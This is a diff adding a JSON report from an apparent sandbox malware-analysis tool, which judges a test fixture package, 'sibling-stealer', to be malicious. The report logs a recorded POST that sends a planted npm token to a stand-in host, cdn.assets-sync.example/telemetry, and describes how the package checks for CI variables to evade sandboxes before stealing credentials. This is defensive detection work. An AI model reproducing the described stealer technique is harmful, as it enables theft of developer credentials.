@@ -1,0 +1,597 @@
+{
+  "job": "08bfcb1046",
+  "target": "D:\\createos-stripe-hackathon\\fixtures\\sibling-stealer",
+  "target_kind": "package",
+  "sha256": "53c4e23c6eca16afcd752b95e28baa3f7e81b044f640a3199ac364affaf5fc7b",
+  "created_at": "2026-10-17T22:59:17+00:00",
+  "verdict": "malicious",
+  "score": 100,
+  "confidence": "high",
+  "findings": [
+    {
+      "id": "gate_exit",
+      "title": "Exited quickly without behaviour; may be gated",
+      "severity": "low",
+      "proof": "signal",
+      "attack": [
+        {
+          "id": "T1497",
+          "name": "Virtualization/Sandbox Evasion",
+          "url": "https://attack.mitre.org/techniques/T1497/"
+        }
+      ],
+      "evidence": [
+        {
+          "round": 0,
+          "event_index": 0,
+          "excerpt": "gate_exit"
+        }
+      ]
+    },
+    {
+      "id": "outbound",
+      "title": "Outbound network attempt to non-registry host",
+      "severity": "medium",
+      "proof": "signal",
+      "attack": [
+        {
+          "id": "T1071.001",
+          "name": "Web Protocols",
+          "url": "https://attack.mitre.org/techniques/T1071/001/"
+        }
+      ],
+      "evidence": [
+        {
+          "round": 0,
+          "event_index": 1,
+          "excerpt": "dns_query:cdn.assets-sync.example"
+        },
+        {
+          "round": 0,
+          "event_index": 2,
+          "excerpt": "dns_query:cdn.assets-sync.example"
+        }
+      ]
+    },
+    {
+      "id": "canary_exfil",
+      "title": "Canary credentials exfiltrated",
+      "severity": "high",
+      "proof": "proof",
+      "attack": [
+        {
+          "id": "T1041",
+          "name": "Exfiltration Over C2 Channel",
+          "url": "https://attack.mitre.org/techniques/T1041/"
+        },
+        {
+          "id": "T1552.001",
+          "name": "Credentials In Files",
+          "url": "https://attack.mitre.org/techniques/T1552/001/"
+        }
+      ],
+      "evidence": [
+        {
+          "round": 1,
+          "event_index": 5,
+          "excerpt": "sink_request:cdn.assets-sync.example canaries=SNDTRP-e8b6a4ec-NPM"
+        }
+      ]
+    },
+    {
+      "id": "cred_read_outbound",
+      "title": "Credential file read followed by outbound attempt",
+      "severity": "high",
+      "proof": "intent",
+      "attack": [
+        {
+          "id": "T1041",
+          "name": "Exfiltration Over C2 Channel",
+          "url": "https://attack.mitre.org/techniques/T1041/"
+        },
+        {
+          "id": "T1552.001",
+          "name": "Credentials In Files",
+          "url": "https://attack.mitre.org/techniques/T1552/001/"
+        }
+      ],
+      "evidence": [
+        {
+          "round": 1,
+          "event_index": 0,
+          "excerpt": "file_read_sensitive:/root/.npmrc"
+        },
+        {
+          "round": 1,
+          "event_index": 1,
+          "excerpt": "dns_query:cdn.assets-sync.example"
+        },
+        {
+          "round": 1,
+          "event_index": 2,
+          "excerpt": "dns_query:cdn.assets-sync.example"
+        },
+        {
+          "round": 1,
+          "event_index": 3,
+          "excerpt": "dns_query:cdn.assets-sync.example"
+        },
+        {
+          "round": 1,
+          "event_index": 4,
+          "excerpt": "dns_query:cdn.assets-sync.example"
+        },
+        {
+          "round": 1,
+          "event_index": 5,
+          "excerpt": "sink_request:cdn.assets-sync.example canaries=SNDTRP-e8b6a4ec-NPM"
+        }
+      ]
+    },
+    {
+      "id": "lure_only",
+      "title": "Behaviour only appears under lure (sandbox evasion)",
+      "severity": "high",
+      "proof": "proof",
+      "attack": [
+        {
+          "id": "T1497",
+          "name": "Virtualization/Sandbox Evasion",
+          "url": "https://attack.mitre.org/techniques/T1497/"
+        }
+      ],
+      "evidence": [
+        {
+          "round": 1,
+          "event_index": 0,
+          "excerpt": "file_read_sensitive:/root/.npmrc"
+        },
+        {
+          "round": 1,
+          "event_index": 5,
+          "excerpt": "sink_request:cdn.assets-sync.example canaries=SNDTRP-e8b6a4ec-NPM"
+        }
+      ]
+    }
+  ],
+  "static_findings": [],
+  "rounds": [
+    {
+      "probe": {
+        "round": -1,
+        "label": "install",
+        "env": {},
+        "lure": false,
+        "sink_reply": "{\"ok\": true}",
+        "clock_offset_days": 0,
+        "driver_code": "",
+        "timeout_s": 45
+      },
+      "exit_code": 0,
+      "stdout": "Processing ./root/work/pkg\n  Installing build dependencies: started\n  Installing build dependencies: finished with status 'done'\n  Getting requirements to build wheel: started\n  Getting requirements to build wheel: finished with status 'done'\n  Preparing metadata (pyproject.toml): started\n  Preparing metadata (pyproject.toml): finished with status 'done'\nBuilding wheels for collected packages: sibling-stealer\n  Building wheel for sibling-stealer (pyproject.toml): started\n  Building wheel for sibling-stealer (pyproject.toml): finished with status 'done'\n  Created wheel for sibling-stealer: filename=sibling_stealer-0.1.0-py3-none-any.whl size=1816 sha256=efd1b89ecbf5128790a876f87f736c08e70e55e328710a8b13f877b01cd423bb\n  Stored in directory: /tmp/pip-ephem-wheel-cache-mnnqb4ko/wheels/13/25/4d/8bd974f2a5e81e37fcc7c028cb3bf8fa1d4ca10e8b1484c5b0\nSuccessfully built sibling-stealer\nInstalling collected packages: sibling-stealer\nSuccessfully installed sibling-stealer-0.1.0\n",
+      "stderr": "",
+      "events": [
+        {
+          "t": 0.377,
+          "pid": 655,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.379,
+          "pid": 655,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "bash",
+              "/usr/local/bin/rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.383,
+          "pid": 655,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "asdf",
+              "exec",
+              "rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.395,
+          "pid": 660,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "env",
+              "-0"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.404,
+          "pid": 655,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/.asdf/installs/rust/1.83.0/toolchains/1.83.0-x86_64-unknown-linux-gnu/bin/rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.446,
+          "pid": 663,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/work/venv/bin/python3",
+              "/root/work/venv/lib/python3.13/site-packages/pip/__pip-runner__.py",
+              "install",
+              "--ignore-installed",
+              "--no-user",
+              "--prefix",
+              "/tmp/pip-build-env-xi3kpd6g/overlay",
+              "--no-warn-script-location",
+              "--disable-pip-version-check",
+              "--no-compile",
+              "--target",
+              ""
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.819,
+          "pid": 665,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "uname",
+              "-rs"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.828,
+          "pid": 666,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.83,
+          "pid": 666,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "bash",
+              "/usr/local/bin/rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.833,
+          "pid": 666,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "asdf",
+              "exec",
+              "rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.846,
+          "pid": 672,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "env",
+              "-0"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 0.855,
+          "pid": 666,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/.asdf/installs/rust/1.83.0/toolchains/1.83.0-x86_64-unknown-linux-gnu/bin/rustc",
+              "--version"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 1.341,
+          "pid": 676,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/work/venv/bin/python3",
+              "/root/work/venv/lib/python3.13/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py",
+              "get_requires_for_build_wheel",
+              "/tmp/tmpzo2ulb89"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 1.754,
+          "pid": 677,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/work/venv/bin/python3",
+              "/root/work/venv/lib/python3.13/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py",
+              "prepare_metadata_for_build_wheel",
+              "/tmp/tmp3nm7k1oi"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        },
+        {
+          "t": 2.015,
+          "pid": 678,
+          "kind": "exec",
+          "data": {
+            "argv": [
+              "/root/work/venv/bin/python3",
+              "/root/work/venv/lib/python3.13/site-packages/pip/_vendor/pyproject_hooks/_in_process/_in_process.py",
+              "build_wheel",
+              "/tmp/tmp7shteztl"
+            ],
+            "suspicious": false
+          },
+          "round": -1
+        }
+      ],
+      "duration_ms": 0,
+      "sandbox_id": "sb-01m561drwj97xv1p52zstfyzjy",
+      "error": ""
+    },
+    {
+      "probe": {
+        "round": 0,
+        "label": "baseline",
+        "env": {},
+        "lure": false,
+        "sink_reply": "{\"ok\": true}",
+        "clock_offset_days": 0,
+        "driver_code": "import importlib, sys, traceback\nfor name in ['sibgate']:\n    try:\n        importlib.import_module(name)\n        print('imported', name)\n    except Exception:\n        print('import-error', name); traceback.print_exc()\n",
+        "timeout_s": 45
+      },
+      "exit_code": 0,
+      "stdout": "imported sibgate\n",
+      "stderr": "",
+      "events": [
+        {
+          "t": 0.098,
+          "pid": 0,
+          "kind": "gate_exit",
+          "data": {
+            "reason": "exited 0 after 0.1s with no observable behaviour"
+          },
+          "round": 0
+        },
+        {
+          "t": 0.144,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "cdn.assets-sync.example",
+            "answered": false
+          },
+          "round": 0
+        },
+        {
+          "t": 0.145,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "cdn.assets-sync.example",
+            "answered": false
+          },
+          "round": 0
+        }
+      ],
+      "duration_ms": 1328,
+      "sandbox_id": "sb-01m561drwj97xv1p52zstfyzjy",
+      "error": ""
+    },
+    {
+      "probe": {
+        "round": 1,
+        "label": "probe-1",
+        "env": {
+          "CI": "1"
+        },
+        "lure": true,
+        "sink_reply": "{\"ok\": true}",
+        "clock_offset_days": 0,
+        "driver_code": "import importlib, sys, traceback\nfor name in ['sibgate']:\n    try:\n        importlib.import_module(name)\n        print('imported', name)\n    except Exception:\n        print('import-error', name); traceback.print_exc()\n",
+        "timeout_s": 45
+      },
+      "exit_code": 0,
+      "stdout": "imported sibgate\n",
+      "stderr": "",
+      "events": [
+        {
+          "t": 0.09,
+          "pid": 732,
+          "kind": "file_read_sensitive",
+          "data": {
+            "path": "/root/.npmrc",
+            "canary": "NPM"
+          },
+          "round": 1
+        },
+        {
+          "t": 0.159,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "cdn.assets-sync.example",
+            "answered": true
+          },
+          "round": 1
+        },
+        {
+          "t": 0.16,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "cdn.assets-sync.example",
+            "answered": false
+          },
+          "round": 1
+        },
+        {
+          "t": 0.176,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "cdn.assets-sync.example",
+            "answered": true
+          },
+          "round": 1
+        },
+        {
+          "t": 0.176,
+          "pid": 0,
+          "kind": "dns_query",
+          "data": {
+            "name": "cdn.assets-sync.example",
+            "answered": false
+          },
+          "round": 1
+        },
+        {
+          "t": 0.177,
+          "pid": 0,
+          "kind": "sink_request",
+          "data": {
+            "host": "cdn.assets-sync.example",
+            "method": "POST",
+            "path": "/telemetry",
+            "body": "{\"npmrc\": \"//registry.npmjs.org/:_authToken=npm_SNDTRP-e8b6a4ec-NPM\\n\"}",
+            "canaries": [
+              "SNDTRP-e8b6a4ec-NPM"
+            ],
+            "orig_dst": ""
+          },
+          "round": 1
+        }
+      ],
+      "duration_ms": 1350,
+      "sandbox_id": "sb-01m561drwj97xv1p52zstfyzjy",
+      "error": ""
+    }
+  ],
+  "baseline_only": [],
+  "lure_only": [
+    "file_read_sensitive:/root/.npmrc",
+    "sink_request:cdn.assets-sync.example"
+  ],
+  "hypotheses": [
+    "The package exfiltrates /root/.npmrc to cdn.assets-sync.example when the host resolves and CI=1 is set.",
+    "The package checks if 'cdn.assets-sync.example' resolves and if a CI environment variable is set (CI, BUILD_NUMBER, or GITHUB_ACTIONS). If both conditions are met, it reads the sensitive file '/root/.npmrc' and exfiltrates its contents via a POST request to 'http://cdn.assets-sync.example/telemetry'."
+  ],
+  "summary": "The 'sibgate' package is a malicious credential stealer. Upon import, it checks if the host 'cdn.assets-sync.example' is resolvable and if the execution environment is a CI/CD pipeline (by checking for environment variables like 'CI', 'BUILD_NUMBER', or 'GITHUB_ACTIONS'). If these conditions are met, it reads the contents of the sensitive file '/root/.npmrc' and exfiltrates the token to 'http://cdn.assets-sync.example/telemetry' via an HTTP POST request.",
+  "attempts": [
+    {
+      "round": 0,
+      "label": "baseline",
+      "exit_code": 0,
+      "note": "default import driver"
+    },
+    {
+      "round": 1,
+      "label": "probe-1",
+      "exit_code": 0,
+      "note": "The package exfiltrates /root/.npmrc to cdn.assets-sync.example when the host resolves and CI=1 is set."
+    }
+  ],
+  "egress_timeline": [
+    {
+      "phase": "create",
+      "rules": [
+        "pypi.org:443",
+        "files.pythonhosted.org:443",
+        "registry.npmjs.org:443"
+      ],
+      "note": "sandbox sb-01m561drwj97xv1p52zstfyzjy"
+    },
+    {
+      "phase": "analysis",
+      "rules": [
+        "192.0.2.1:9"
+      ],
+      "note": "registry access closed; lure runs on loopback only"
+    }
+  ],
+  "patch_diff": "",
+  "remediation": "",
+  "capture_method": "strace",
+  "model": "gemini-3.5-flash",
+  "llm_calls": 4,
+  "sandbox_ids": [
+    "sb-01m561drwj97xv1p52zstfyzjy"
+  ],
+  "destroyed": true,
+  "limitations": [
+    "Dynamic analysis runs on Linux only; Windows executables are not executed.",
+    "HTTPS request bodies cannot be read without interception: TLS destinations are recorded by SNI only.",
+    "Evasive code that detects tracing or waits longer than the probe timeout may look quiet; such runs are reported as inconclusive, never clean.",
+    "Canary proof covers the credential types we plant (ssh key, aws, npm, .env)."
+  ],
+  "report_url": "",
+  "intel": [],
+  "used_skills": [],
+  "learned_skills": [],
+  "threat_brief": "",
+  "from_cache": false
+}
